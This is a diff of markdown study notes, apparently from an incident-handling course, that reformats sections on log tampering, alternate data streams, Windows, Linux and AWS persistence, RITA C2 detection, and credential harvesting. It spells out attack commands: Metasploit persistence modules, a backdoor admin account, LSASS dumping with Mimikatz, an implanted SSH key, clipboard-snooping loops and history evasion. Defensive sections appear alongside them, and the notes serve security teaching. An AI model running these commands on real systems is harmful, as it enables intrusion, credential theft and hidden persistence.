-returning to a Meterpreter session we will run the exploit using, `use exploit/windows/local/wmi_persistence`, so here the exploit will run when a user login fail with the username of josh is attempting to login `set username_trigger josh`, then we’ll use to set a delay before executing the payload `set callback_interval 1000` , to trigger the payload the attacker must attempt to login and fail , triggering event ID `4624`, this can be triggered by the `smbclient` tool or any other login like SMB and RDP connections.
+```bash title="Find writable directories"
+find / -type d -perm -0222 2>/dev/null
+```
 
-### Active Directory Persistence: Golden Ticket Persistence
+### UNIX Log Editing
 
-windows systems use Kerberos as a modern authentication mechanism allowing untrusted devices in a network to verify the identity and authorization for users and services in every windows domain there will be a kerberos user account often with the name `kbrtgt (Kerberos Ticket Granting Ticket)`.
+After taking over a system, attackers typically alter system logs to erase entries associated with their access techniques. Some might clear all logs — easily noticeable to sysadmins — but sophisticated attackers delete only selected entries, removing just the incorrect logins or process crashes related to their exploitation.
 
-the password for this user is generated when a domain is created and its used as the root of trust in the kerberos network, responsible for all authorization in intermediate level. in the kerberos network there is this attack called the golden ticket attack these are the four basic steps this attack grants attackers unauthorized access and persistence to the network.
+On UNIX, the syslog process stores logs; its configuration is in `/etc/syslog.conf`. By default, logs are stored in `/var/log`. Some applications maintain their own directories — Apache uses `/var/log/httpd`, Nginx uses `/usr/local/nginx/logs`.
 
-first an attacker must compromise a domain controller, through a exploit that grants admin privilege or any other manner 
+With root privilege, an attacker can edit log files. Since most logs in `/var/log` are written in ASCII, they're editable with tools like `vi` or `nano`.
 
-next the attacker must retrieve the krbtgt user password hash 
+### Shell History
 
-once the attacker have the password hash, this hash can be used to forge Ticket Granting Tickets (TGTs) using `Mimikatz` or `Impacket`. 
+In UNIX shells, each command typed is optionally recorded. By default, bash history is stored in `$HOME/.bash_history` for each user (typically 500–1000 recent commands).
 
-finally with the ability to forge TGTs, an attacker can skip the Kerberos authentication process, simply by feeding the forged trusted ticket at any service on the network 
+Attackers prevent commands from being saved using techniques like:
 
-in this attack the adversary abuse the root of trust in kerberos network to sidestep all the authentication requirements, this kind of attack is also seen when a certificate authority AC is compromised, as all the roots of authentication services is under the attackers hand he can forge tokes as he wish.
+```bash title="Prevent history recording"
+unset HISTFILE
+```
 
-### Web Shells:
+or
 
-compromised systems that run a web service are common targets for web shell persistence mechanism where an attacker modifies the web page or app to gain persistence. after compromising the web server an attacker can insert code that when executed will give an attacker remote access to the system, this can be done by changing a file or adding a new one with web shell code to the server some times this can be hidden or obfuscated to avoid detection. lets take an example where a file names `imageupload.html` that added by the attacker that allowed an attacker to submit one or more command to be executed. 
+```bash title="Kill the shell to avoid history flush"
+kill -9 $$
+```
 
-### Linux persistence:
+In some Linux distributions, prefixing a command with a space eliminates it from history — but only when the `HISTCONTROL` environment variable is set to `ignorespace`.
 
-so far we have looked in tons of persistence mechanisms , most of which can be applied in Linux like the add user which can be achieved using the `adduser` command scheduled tasks created using `crontab`, debugging facilities are available through the GNU debugger gdb. and finally SSH is often used for remote access in Linux instead of creating a new user attackers can choose to add a new SSH public key entry in the users `authorized_keys`file to remote login without relying on known user password once the victim system have the attacker public key in the `authorized_keys`file, the attacker now can login using there private key bypassing the password entry with the `-i` argument.
+### Accounting Entries in UNIX
 
-lets look at the steps:
+UNIX systems have four accounting files:
 
-`attacker $ ssh-keygen`
+- **`utmp`** — stores info on all currently logged-in users; the `who` command reads it.
+- **`wtmp`** — stores info on all users who have ever logged in.
+- **`btmp`** — stores info on failed login attempts (often disabled because it records accidental password typos).
+- **`lastlog`** — shows the most recent login time and date for each user.
 
-`victim $ cat >> ~/.ssh/authorized_keys, <paste contents of attacker_rsa.pub>`
+Attackers want to modify these files so sysadmins can't detect their activity, but they can't simply edit them as text — they're written in a `utmp` structure and require specialized tools. Rather than trying to edit them, attackers often just delete them.
 
-### cloud Persistence:
+### Windows — Alternate Data Streams
 
-cloud are another target for an adversary to obtain persistence access in the cloud, while some of the principles mentioned before can be applied here , but cloud are targeted by manipulating the Identity and Access Management (IAM) functionality's.
+:::note
+Attackers leverage Alternate Data Streams (ADS) to hide files in NTFS and ReFS filesystems. ADS allows a single file to have a default data stream plus additional independent streams. The content follows the file across copy/move operations as long as the filesystem supports ADS. When defenders examine files using `dir`, `Get-ChildItem`, or Windows Explorer, they only see the default stream.
+:::
 
-getting access to LAM allows attacker to gain privileged access to the infrastructure if the cloud account is compromised attackers can create new users , create backdoors key access to account so even if the password is changed you can still login 
+**Creating ADS:**
 
-for AWS attackers can enumerate IAM accounts with the aws cli tool using this command `aws iam list-user`, AWS accounts allow up to two remote access keys for each IAM user account so the attacker wants to identify a user that has 1 or no keys already associated with there account using this command `aws iam list-access-keys --user-name jsmith` , once the attacker identifies the target user account they can create a new access key using this `aws iam create-access-key --user-name jsmith`.
+Using the `type` command:
 
-### Defense:
+```bash title="Hide a file in an ADS"
+type NTDS.dit > Kitchen.docx:NTDS.dit
+```
 
-persistence defense techniques, are concerned with discovery and identification. Since persistence is a post-exploitation technique, remediation is also important after we identify the source of the persistence, but that comes after identification.
+In PowerShell:
 
-for windows use the Sysinternals `Autoruns`, as it shows all the attacks we have discussed. Auto-Start Extensibility Points (ASEPs), scheduled tasks, services, WMI event subscriptions, and event-triggered execution through debugging capabilities (silent process exit), in a clean GUI, and cli if you want. 
+```bash title="Create an ADS with PowerShell"
+Get-Content -Path .\NTDS.dit | Set-Content -Path .\OfficeKitchen.docx -Stream NTDS.dit
+```
 
-other techniques like adding anew user we can use methods that allows to identify unauthorized changes like the use of `net user`commands. 
+Notepad can also be used:
 
-also monitor windows for these events ID `4624`(An account was successfully logged on), `4634`(An account was logged off), `4672`(Special privileges assigned to new logon), `4732`(A member was added to a security-enabled local group), `4648`(A logon was attempted using explicit credentials), `4688` (A new process has been created), `4697`(A service was installed in the system), and `4768`(A Kerberos authentication ticket (TGT) was requested).
+```bash title="Create an ADS with notepad"
+notepad defaultfile.txt:secretfile.txt
+```
 
-if you suspect an attacker has compromised the domain using a golden ticket attack, it is necessary to change the krbtgt password twice. The krbtgt account keeps a password history of 1, so change the password once is not enough to invalidate the attacker's access to forge Kerberos tokens.
+Data stored in an ADS can be binary, PowerShell scripts, Office files, or executables. To launch them:
 
-one problem with using any of these things or even PowerShell commands is that thy don't scale well so you need to invest in a enterprise EDR tool.
+```bash title="Execute a file stored in an ADS"
+wmic process call create C:\TEMP\OfficeKitchen.docx:flamingo.exe
+```
 
-always keep in mind that attackers will deploy more then one persistence method as the goal of an attacker, so deploying two or more persistence techniques gives an attacker even more reliability and flexibility in meeting their goals. As an incident responder, don't assume that the persistence method you've identified is the only method used by an attacker.
+**Finding ADS:**
 
-be carful with your analysis use Microsoft tools like `netstat, wmic, reg, schtasks, sc`. As an incident responder, your greatest strength in identifying persistence is understanding the techniques that are applied by adversaries to achieve their goals.
+Several tools identify alternative data streams. Built-in commands include:
 
-![image.png](././Sec_504_book5/image_6.png)
+```bash title="Show all files and streams in a directory"
+dir /r
+```
 
-## RITA:
+In PowerShell:
 
-attackers have been learning  and evading detection now they can easily evade IDS tools, The Real Intelligence Threat Analytics (RITA) is a free open source solution that help identify attackers C2 using statistical anomaly analysis, it docent rely on packet payload inspection like normal IDS , it looks for signs or network activity that correspond to patterns used by C2 tools. its used to offline assessment of network activity, using logs generated by Zeek, it provides the best results with logging data that 24 hours or more, its an effective threat hunting tool to aid analysts in identifying and reacting to compromises in a network. 
+```bash title="Find all ADS in current directory"
+Get-Item * -Stream *
+```
 
-### Fundamentally Different Network Behavior:
+Search all subdirectories for non-default streams:
 
-Attackers don't behave like normal networks dose and here are some of the most notable differences 
+```bash title="Recursively find all non-default ADS"
+Get-ChildItem -recurse | ForEach { Get-Item $_.FullName -stream * } | Where stream -ne ':$DATA'
+```
 
-long connection duration between the C2 and the victim end point 
+Microsoft Sysinternals `streams64.exe` also identifies ADS:
 
-lost of consistent data sizes in the packers used for heartbeat checking 
+```bash title="Find and remove ADS with Sysinternals"
+streams64.exe -s -d
+```
 
-consistent packets intervals (within a C2 sleep timer)
+The `-s` flag searches recursively; `-d` removes non-default streams.
 
-consistent packet intervals within a jitter matric (skew)
+### Defenses
 
-a total session size or byte count consistency 
+One of the most effective defenses is using a separate logging server. If an attacker compromises a system, they can find and alter local logs, but they can't easily remove evidence from a remote server. Configure syslog on Unix to send logs to a remote host by editing the configuration file.
 
-RITA use all of these and other characteristics to identify attackers C2 in an organization, its not specific for any C2 framework but rather works for all. 
+For Windows, deploy Windows Event Forwarding (WEF). Combine this with User and Entity Behavioral Analytics to identify log gaps, corrupted logs, and unusual files.
 
-### basic use of RITA:
+![image.png](./Sec_504_book5/image_5.png)
 
-to start we first need to make a directory to store the Zeek data, then we use this command form Zeek cli `zeek -Cr ~/big-capture.pcap`where the `-r` is to read the captured file and the `-C` is to ignore the TCP checksum. then we import Zeeks data into RITA with the DB named my network using this command `rita import . mynetwork`, and finally generating the report with this command `rita html-report mynetwork` .
+## Establishing Persistence
 
-the generated HTML report shows different analysis functionalities like:
+Almost all attackers seek to establish a persistence mechanism on a compromised host. Many exploits don't grant persistence automatically — a reboot or defensive action may terminate access — so persistence mechanisms are essential.
 
-- Beacons: Regular timing between connections / packets
-- Strobes: High packet counts in short period of time sent without stealth
-- DNS: Exploded DNS analysis
-- Deny List Sources (BL Source IPs): Connections from deny list IP addresses
-- Deny List Destinations (BL Dest. IPs): Connections from deny list IP addresses
-- Deny List Hostnames (BL Hostnames): Hostnames of deny list IP addresses
-- Long Connections: Long connection times for TCP-established sessions
-- User Agents: Web browser User Agent statistics
+Choosing a persistence method depends on several factors:
 
-![image.png](././Sec_504_book5/image_7.png)
+- Regaining access to the compromised system
+- Avoiding detection
+- Preserving privileges and access
+- Having flexible triggers for reestablishing access
 
-we can also examine specific RITA analysis functions by calling it directly like `rita show-beacons database-name`, also you can add `-H` flag to get human readable table.
+For many attackers, the persistence method is built into the attack framework and C2 tools used — such as Metasploit Meterpreter or other frameworks.
 
-### Beacon Analysis:
+### Persistence on Windows
 
-RITA is a threat hunting tool intended to help analysts unlike IDS which characterize a specific attack on the network. RITA doesn't identify a specific C2 or threat group. 
+**Creating Accounts:**
 
-beaconing is a characteristic of C2 frameworks where a compromised system reaches out for the controlling server withe periodic frequency. the  beacon packets are like waiting for orders  from the attackers server , so the client will do as told. such as downloading  a file or executing a command, many C2 frame works utilize beacon packets in there network implementation with regular frequencies like every minute or 5 or even 10.  the beacon interval (the time between beacon packets) is generally short in nature.
+The most straightforward persistence method on Windows is creating a new user account and making it an administrator. From a Meterpreter shell established by a previous exploit, use the `execute` command to run local Windows commands. The `-f` argument runs the command as a background, non-interactive process:
 
-RITA uses the characteristic of beaconing to identify threat, by identifying presence of a Score value near or at 1, this value indicates the regularity in beacon interval timing for the duration of the network traffic, a score of 1 indicates a perfect repletion of packet activity between the source and the destination endpoint.
+```bash title="Create a new user account"
+execute -f "net user /add assetmgtacct Att@ckerPassw0rd"
+```
 
-### Long Connections:
+:::note
+The password must meet the system's minimum complexity requirements.
+:::
 
-normally client devices will connect to another endpoint, exchange data, then disconnect , However some C2 frameworks like Meterpreter will establish and keep a TCP session for extended periods of time. that another way to characterize threats in the network. 
+Add the user to the local administrators group:
 
-in this example using this command `rita show-long-connections -H mynetwork | head -15`  we see several internal hosts connecting to different targets in the internet using TCP/443 with a very long connection time.
+```bash title="Add user to administrators group"
+execute -f "net localgroup administrators /add assetmgtacct"
+```
 
-![image.png](././Sec_504_book5/image_8.png)
+Verify everything is working:
 
-### DNS Analysis:
+```bash title="List all user accounts"
+execute -i -f "net user"
+```
 
-RITA also have have DNS analysis that reveals the presence of DNS tunneling tools such as DNSCat2, the output of the DNS analysis revels, Query domain from the internal host, the number of unique subdomains associated with the host, and the number of times the internal system queried the total number of subdomains. normally the number of sub domains for a given domain is reactively a small number at most hundreds. not much exceeds this, to communicate through DNS tunneling and to avoid DNS cachsingDNSCat2 another tools will generate many unique subdomains for the c2 channel. so when you see a lot of sub domains like in this example this can indicates a compromission the network.
+The `-i` flag returns output and makes the command interactive.
 
-![image.png](././Sec_504_book5/image_9.png)
+**Services:**
 
-### a Threat Hunting Tool:
+Beyond OS-specific commands, Metasploit and other frameworks offer automated persistence scripts. The `persistence_service` exploit is one example. Windows services are background tasks managed by the OS that can start automatically at boot or after a specified delay — making them an ideal persistence mechanism.
 
-RITA aids analysts not a tool that provides a list of compromised host that you should involve in your incident response process. instead use RITA as a starting point to you analysis which can  help and gaud you. use the IP’s you found and do some OSINT use 3rb parti ls like SHODAN to help you. you can black list or whitelist  a host in the config.yaml file.
+The Metasploit `persistence_service` module automates creating the service and generates a payload written to the temp directory.
 
-![image.png](././Sec_504_book5/image_10.png)
+**Silent Process Exit:**
 
-## Data Collection:
+Attackers also abuse built-in Windows features to establish persistence less suspiciously. Windows includes debugging features for developers — one of them is silent process exit, which launches a debugger process when a target process terminates (normally or unexpectedly).
 
-for many attackers data collection may be the ultimate goal behind there attack stealing secrets intellectual data, financial records, credit cards,… 
+:::caution
+Metasploit's `persistence_image_exec_options` exploit leverages the silent process exit mechanism, but it requires SYSTEM privileges. The attacker must first migrate into a SYSTEM-level process.
+:::
 
-### Linux password Harvesting:
+List all SYSTEM processes:
 
-beyond the already known password hash info stored in the `etc/shdow` file attackers find passwords disclosed in other locations on the file system or the output of command-line arguments.  several things an attacker can do is shown in the image below the password disclosed in the process list and file system location may reveal local passwords but it can also reveal other passwords. Ex. a common location attackers loot at it the`.bash_history` file , but why cuz users may supply a password as a command line argument like this command `mysql -u root -prootDBpassword`for the mysql BD. most of these commands shown here may require root privilege.
+```bash title="List SYSTEM-level processes"
+ps -s
+```
 
-![image.png](././Sec_504_book5/image_11.png)
+Migrate into one:
 
-### Sudo Privileges:
+```bash title="Migrate into a SYSTEM process"
+migrate -N GoogleCrashHandler64.exe
+```
 
-one opportunity to escalate privileges on a Linux system to check the configuration of the sudo command, the sudo allows a user to run a command with the privileges of another user, often the root user. an admin can configure sudo to allow a user to any command or a specific set of commands. since an admin wants to grant user access or run a specific tool with extra privileges. an attacker can enumerate the privilege allocated to the user by running `sudo -l`, like in this Ex. the user `minyawy`is permitted to run `GNU`debugger. as root this is common since it may be required for the developers to troubleshoot a process that is running as root.  this is an opportunity for attackers as they can abuse this selected sudo privilege, so in this example GDB have a shell command which will the attacker a sudo shell just like that.
+Background the current session and load the exploit:
+
+```bash title="Load the silent process exit persistence exploit"
+use exploit/windows/local/persistence_image_exec_options
+```
+
+Set the parameters:
+
+```
+set lhost 10.10.75.1
+set image_file notepad.exe
+set path c:\temp
+set payload_name calc
+set session 1
+run
+```
+
+Now, when the attacker's Meterpreter connection dies (e.g., after a reboot), they wait for the victim to open and close Notepad. The debugger then launches `calc.exe`, establishing a new Meterpreter session.
+
+:::note
+This configuration is persistent on the Windows system, saved in the registry at:
+`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessName`
+
+Anytime the attacker loses access, they only need to wait for the targeted process to open and close to reestablish connection. This mechanism is attractive because it's less predictable than a constantly-running service — it may remain dormant for hours or months depending on victim system usage.
+:::
+
+**WMI Event Subscription:**
+
+Windows Management Instrumentation (WMI) is a built-in feature allowing users to interface with drivers and system components to collect data and subscribe to arbitrary Windows events. Similar to scheduled tasks (where code runs based on time of day or delay), WMI is far more flexible — it can run code based on almost any system behavior: boot, failed login, CPU spike, disk full messages, and more.
+
+:::tip
+WMI flexibility makes it valuable for attackers as a persistence mechanism. Like scheduled tasks, an attacker can create a process that establishes a C2 connection, but WMI offers nearly unlimited flexibility in choosing the triggering event.
+:::
+
+Attackers can write a Managed Object File (`.mof` extension) describing the subscription and the event to trigger malicious code execution. MOF syntax is similar to C++, and it's compiled and executed using the Windows built-in tool `mofcomp.exe`. Alternatively, use Metasploit's built-in `wmi_persistence` exploit or other tools.
+
+From a Meterpreter session, load the exploit:
+
+```bash title="Load the WMI persistence exploit"
+use exploit/windows/local/wmi_persistence
+```
+
+Set the trigger event — for example, a failed login by username `josh`:
+
+```bash title="Set the trigger username"
+set username_trigger josh
+```
+
+Set a delay before payload execution:
+
+```bash title="Set callback interval"
+set callback_interval 1000
+```
+
+To trigger the payload, the attacker attempts to log in and fail (event ID `4624`), which can be triggered using `smbclient` or any SMB/RDP login attempt.
+
+**Active Directory Persistence: Golden Ticket**
+
+:::important
+Windows domains use Kerberos for authentication. Every Windows domain has a `krbtgt` (Kerberos Ticket Granting Ticket) user account whose password serves as the root of trust. The golden ticket attack exploits this by forging Ticket Granting Tickets (TGTs), granting unauthorized access and persistence.
+:::
+
+The attack proceeds in four basic steps:
+
+1. Compromise a domain controller through exploitation or other means.
+2. Retrieve the `krbtgt` user password hash.
+3. Use the hash to forge TGTs with `Mimikatz` or `Impacket`.
+4. Feed the forged trusted ticket to any service on the network, bypassing Kerberos authentication entirely.
+
+By abusing the root of trust in the Kerberos network, attackers sidestep all authentication requirements. This same attack applies when a Certificate Authority is compromised — all authentication services then fall under the attacker's control.
+
+**Web Shells:**
+
+Compromised web servers are common targets for web shell persistence. After compromising the server, an attacker inserts code that grants remote access when executed. This can be done by modifying an existing file or adding a new one with web shell code, sometimes hidden or obfuscated.
+
+For example, an attacker might add a file named `imageupload.html` that allows submitting one or more commands for execution on the server.
+
+### Linux Persistence
+
+Many persistence mechanisms apply to Linux as well:
+
+- Adding users with the `adduser` command
+- Creating scheduled tasks with `crontab`
+- Using GNU debugger (`gdb`) for debugging facilities
+- Using SSH for remote access
+
+Instead of creating a new user, attackers often add a new SSH public key to the user's `authorized_keys` file, allowing remote login without requiring a known password:
+
+```bash title="Generate SSH keypair"
+ssh-keygen
+```
+
+On the victim system:
+
+```bash title="Add attacker's public key to authorized_keys"
+cat >> ~/.ssh/authorized_keys < paste contents of attacker_rsa.pub >
+```
+
+Now the attacker logs in using their private key with the `-i` argument, bypassing password entry.
+
+### Cloud Persistence
+
+Cloud environments present different persistence opportunities. While some principles from traditional systems apply, cloud persistence primarily involves manipulating Identity and Access Management (IAM) functionality.
+
+Getting access to IAM allows attackers to gain privileged access to the infrastructure. If a cloud account is compromised, attackers can create new users, create backdoor access keys so access persists even if the password is changed.
+
+For AWS, enumerate IAM accounts:
+
+```bash title="List AWS IAM users"
+aws iam list-users
+```
+
+AWS accounts allow up to two access keys per IAM user. Identify users with only one or no keys:
+
+```bash title="List access keys for a specific user"
+aws iam list-access-keys --user-name jsmith
+```
+
+Create a new access key for the target user:
+
+```bash title="Create a new access key for persistence"
+aws iam create-access-key --user-name jsmith
+```
+
+### Defense
+
+Persistence defense focuses on discovery and identification. Remediation comes after identifying the persistence mechanism.
+
+For Windows, use Sysinternals **Autoruns**, which displays all the persistence mechanisms discussed: Auto-Start Extensibility Points (ASEPs), scheduled tasks, services, WMI event subscriptions, and debugging-triggered execution (silent process exit).
+
+For detecting unauthorized account creation, monitor for commands like `net user`.
+
+Monitor Windows for these event IDs:
+
+- `4624` — An account was successfully logged on
+- `4634` — An account was logged off
+- `4672` — Special privileges assigned to new logon
+- `4732` — A member was added to a security-enabled local group
+- `4648` — A logon was attempted using explicit credentials
+- `4688` — A new process has been created
+- `4697` — A service was installed in the system
+- `4768` — A Kerberos authentication ticket (TGT) was requested
+
+:::warning
+If you suspect a golden ticket attack on a compromised domain, change the `krbtgt` password twice. The `krbtgt` account keeps only one password in history, so a single change isn't enough to invalidate the attacker's forged tokens.
+:::
+
+These detection methods don't scale well, so invest in an enterprise EDR tool. Also remember that attackers often deploy multiple persistence methods — don't assume the one you've found is the only one.
+
+Use Microsoft tools like `netstat`, `wmic`, `reg`, `schtasks`, and `sc` carefully. As an incident responder, your greatest strength in identifying persistence is understanding the techniques attackers use to achieve their goals.
+
+![image.png](./Sec_504_book5/image_6.png)
+
+## RITA (Real Intelligence Threat Analytics)
+
+Attackers have learned to evade traditional IDS tools through statistical evasion. RITA is a free, open-source solution that identifies attacker C2 using statistical anomaly analysis rather than packet payload inspection. It processes logs generated by Zeek and works best with 24+ hours of logging data, making it an effective threat hunting tool for identifying and responding to network compromises.
+
+### Fundamentally Different Network Behavior
+
+Attackers don't behave like normal networks. Key differences include:
+
+- Long connection durations between C2 and victim endpoint
+- Consistent data sizes in packets used for heartbeat checking
+- Consistent packet intervals (within C2 sleep timers)
+- Consistent packet intervals with jitter metrics (skew)
+- Total session size or byte count consistency
+
+RITA uses these characteristics to identify attacker C2 across any organization — it's not specific to any one C2 framework, but works for all.
+
+### Basic Use of RITA
+
+First, create a directory to store Zeek data. Process a PCAP file with Zeek:
+
+```bash title="Process PCAP with Zeek"
+zeek -Cr ~/big-capture.pcap
+```
+
+The `-r` flag reads the captured file; `-C` ignores TCP checksums. Import Zeek's data into RITA:
+
+```bash title="Import Zeek data into RITA"
+rita import . mynetwork
+```
+
+Generate the HTML report:
+
+```bash title="Generate RITA HTML report"
+rita html-report mynetwork
+```
+
+The generated report includes analysis of:
+
+- **Beacons** — regular timing between connections/packets
+- **Strobes** — high packet counts in short periods without stealth
+- **DNS** — detailed DNS activity analysis
+- **Deny List Sources/Destinations** — connections from/to blocklisted IPs
+- **Deny List Hostnames** — hostnames associated with blocklisted IPs
+- **Long Connections** — long TCP session durations
+- **User Agents** — web browser User Agent statistics
+
+![image.png](./Sec_504_book5/image_7.png)
+
+Examine specific RITA functions directly:
+
+```bash title="Show beacon analysis"
+rita show-beacons -H mynetwork
+```
+
+The `-H` flag returns a human-readable table.
+
+### Beacon Analysis
+
+RITA is a threat hunting tool intended to guide analysts — unlike IDS, which flags specific attacks. RITA doesn't identify specific C2 frameworks or threat groups.
+
+:::note
+Beaconing is a characteristic of C2 frameworks where a compromised system periodically reaches out to the control server, waiting for orders (file downloads, command execution, etc.). Many C2 frameworks use regular beacon intervals — every 1, 5, or even 10 minutes.
+:::
+
+RITA identifies beaconing by looking for a Score value near or at 1, indicating regular beacon timing over the traffic duration. A score of 1 means perfect repetition of packet activity between source and destination.
+
+### Long Connections
+
+Normally, client devices connect to another endpoint, exchange data, then disconnect. However, some C2 frameworks like Meterpreter maintain TCP sessions for extended periods.
+
+```bash title="Show long-duration connections"
+rita show-long-connections -H mynetwork | head -15
+```
+
+This reveals internal hosts with very long TCP/443 connections to external targets.
+
+![image.png](./Sec_504_book5/image_8.png)
+
+### DNS Analysis
+
+RITA also analyzes DNS to reveal DNS tunneling tools like DNSCat2. The output shows query domains, the number of unique subdomains, and query frequency. Normally, subdomains for a domain are relatively few (at most hundreds). DNS tunneling tools generate many unique subdomains to avoid DNS caching.
+
+![image.png](./Sec_504_book5/image_9.png)
+
+### RITA as a Threat Hunting Tool
+
+RITA guides analysts rather than providing a definitive list of compromised hosts. Use it as a starting point for deeper investigation: take the IPs you find, conduct OSINT, use tools like Shodan. You can blacklist or whitelist hosts in the `config.yaml` file.
+
+![image.png](./Sec_504_book5/image_10.png)
+
+## Data Collection
+
+For many attackers, data collection is the ultimate goal — stealing secrets, intellectual property, financial records, credit cards, and more.
+
+### Linux Password Harvesting
+
+Beyond the password hashes in `/etc/shadow`, attackers find passwords disclosed elsewhere on the filesystem or in command-line arguments. Common locations include:
+
+- `.bash_history` files (users may supply passwords as command-line arguments, e.g., `mysql -u root -prootDBpassword`)
+- Process listings
+- Filesystem locations
+
+Most of these locations require root privilege.
+
+![image.png](./Sec_504_book5/image_11.png)
+
+### Sudo Privileges
+
+One escalation opportunity is examining sudo configuration. The `sudo` command lets users run commands with other users' privileges (often root). Check allocated privileges:
+
+```bash title="Check user's sudo privileges"
+sudo -l
+```
+
+For example, if user `minyawy` is permitted to run the GNU debugger as root, this is an escalation opportunity since GDB has a shell command that grants a sudo shell.
 
 ### Windows Passwords: Mimikatz
 
-Mimikatz is a well-know tool for extracting passwords and passwords hash from windows. since its a well know tool used by attackers so Microsoft has developed extensive defensive measures to protect against attacks using it.  however Mimikatz doesn't require that it run on The victim , it can also retrieve password info from the process memory of LSASS and other system process to extract passwords. the `Sysinternal` tool `Procdump`can retrieve a memory dump of a named process using this command`.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp`, and its a Microsoft tool so attacker can use it without being caught. Mimikatz can extract passwords from the LSASS process on a victim by supplying the process dump using this command. `sekurlsa::minidump lsass.dmp`. this is used to evade detection, it have a disadvantage or requiring a larger data transfer (the LSASS dump), its an alternative to running Mimikatz in the victim system locally. 
+:::tip
+Mimikatz is a well-known tool for extracting passwords and hashes from Windows. However, it doesn't need to run on the victim — it can retrieve password info from process memory.
+:::
 
-### Password Managers and Clipboard Access:
+Use Sysinternals' `Procdump` to retrieve an LSASS memory dump:
 
-password mangers offer users many benefits, like automated creation and storage of long complex passwords, so the user doesn't have to memorize them, although its uncommand for password mangers to have vulnerabilities that allows attackers to access the password storage, but they all have a common vulnerability the use of clipboard. 
+```bash title="Dump LSASS process memory"
+.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+```
 
-copying password to clipboard is integrated as a feature, but in Windows and macOS any other process has access to the clipboard data, and also the ability of retrieving  and manipulating the contents, this is an golden opportunity for attackers. as with a simple PowerShell/bash command attackers can copy the data and sent it to a network. using this commands. `PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { WriteHost $y; $x=$y } }`,`macos~ $ x=""; while true; do y=`pbpaste`; if [ "$x" != "$y" ] ; then echo $y; x=$y; fi; done`
+Then use Mimikatz to extract passwords from the dump:
 
-### Meterpreter Keystroke Logging:
+```bash title="Extract passwords from LSASS dump"
+sekurlsa::minidump lsass.dmp
+```
 
-Meterpreter framework includes integrated support for keystroke logging. Once an attacker establishes a Meterpreter session, they can run the `keyscan_start` module to start capturing keystroke data. Meterpreter will continue to capture keystrokes for all users (including RDP sessions) until the `keyscan_stop`command is issued. At any time, the attacker can examine the log of keystrokes by running the `keyscan_dump` command.
+This avoids running Mimikatz on the victim but requires transferring the larger dump file.
 
-![image.png](././Sec_504_book5/image_12.png)
+### Password Managers and Clipboard Access
 
-### Defenses:
+Password managers provide security benefits but have a common vulnerability: clipboard access. Any process can read and manipulate clipboard data on Windows and macOS.
 
-network filtering combined with monitoring for unauthorized access attempts. Network monitoring tools can reveal unusual network activity. The Real Intelligence Threat Analytics (RITA) can also be applied as a defense to identify Command & Control (C2) indicators that can reveal compromised systems. endpoint security tools including application trust lists can be used to limit access to built-in and third-party software. This is best applied as a threat hunting mechanism, creating an opportunity to identify compromised systems when attackers attempt to run unauthorized tools. use SRUM data to characterize data transfer tools by app name, which can be valuable to characterize the amount and possible sources of data that is extracted from a compromised system.
+Attackers can monitor the clipboard and exfiltrate copied passwords:
 
-![image.png](././Sec_504_book5/image_13.png)
+```bash title="Monitor clipboard on Windows (PowerShell)"
+$x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y } }
+```
+
+```bash title="Monitor clipboard on macOS"
+x=""; while true; do y=`pbpaste`; if [ "$x" != "$y" ] ; then echo $y; x=$y; fi; done
+```
+
+### Meterpreter Keystroke Logging
+
+:::note
+Meterpreter includes built-in keystroke logging. Once a session is established, start capturing:
+:::
+
+```bash title="Start keystroke capture"
+keyscan_start
+```
+
+Capture continues for all users (including RDP sessions) until:
+
+```bash title="Stop keystroke capture"
+keyscan_stop
+```
+
+Examine the log anytime:
+
+```bash title="Display captured keystrokes"
+keyscan_dump
+```
+
+![image.png](./Sec_504_book5/image_12.png)
+
+### Defenses
+
+Combine network filtering with monitoring for unauthorized access attempts. Network monitoring tools and RITA can reveal C2 indicators. Endpoint security tools with application allowlists limit unauthorized tool execution. SRUM data can characterize data transfer tools by application name, revealing the extent and possible sources of exfiltrated data.
+
+![image.png](./Sec_504_book5/image_13.png)
 
 ## Cloud Spotlight: Cloud Post-Exploitation
 
-we have already seen techniques that allows an attacker to exploit a system, so here we’ll start with the assumption that the attacker have some AWS credentials to start with. 
+Assuming the attacker has stolen AWS credentials, they begin by collecting as much enumeration data as possible. The table below shows commonly used reconnaissance commands:
 
-so following the discovery of credentials, attackers will collect as much info as they can, which can be called a situation report, the table below will show some of the most used commands in enumeration. 
-
-| `aws sts get-caller-identity`  |  Basic access test, identify username for UserId |
+| Command | Purpose |
 | --- | --- |
+| `aws sts get-caller-identity` | Basic access test; identify username |
 | `aws ec2 describe-instances` | Enumerate EC2 instances |
-| `aws s3 ls`  | List S3 buckets |
-| `aws lambda list-functions`  | List Lambda functions |
-| `aws iam list-role`  | List roles (permissions) associated with the user |
-| `aws iam list-users`  | List other user accounts to target (privesc targets) |
-| `aws logs describe-log-group`  | Enumerate log groups (what is being monitored?) |
+| `aws s3 ls` | List S3 buckets |
+| `aws lambda list-functions` | List Lambda functions |
+| `aws iam list-roles` | List roles and associated permissions |
+| `aws iam list-users` | List user accounts (privilege escalation targets) |
+| `aws logs describe-log-groups` | Enumerate log groups (what's being monitored?) |
 
-the AWS STS  is the security token service, a service that allows users to request temporary IAM credentials withe limited privileges. azure also have similar functionalities using the `az` command, and google with `gcloud` and `gsutil` .
+AWS STS (Security Token Service) allows users to request temporary IAM credentials with limited privileges. Azure has similar functionality with `az` commands, and Google with `gcloud` and `gsutil`.
 
-### WeirdAAL Enumeration:
+### WeirdAAL Enumeration
 
-while attackers can run commands manually to enumerate basic access, but it gets more complex to enumerate all access premotions, so that why a script like WeirdAAL comes in handy it automates the process of enumerating AWS access privileges and cloud assets, it will use AWS list function if the caller have there access, otherwise it will brute-force access attempts for all known permissions to discover access opportunities granted through the credentials feed in the `.env` file in the same directory, its noisy if the failed access logging is configured through CloudTrail. it also supports the use of different modules like the  `recon_all` module  which will perform reconnaissance using the specified AWS credentials for all known access opportunities (WeirdAAL is updated often as new access privileges are defined in AWS). an attacker can use a specific module to enumerate permissions and access for a target cloud service; get all modules by running `python3 weirdAAL.py -l`
+:::tip
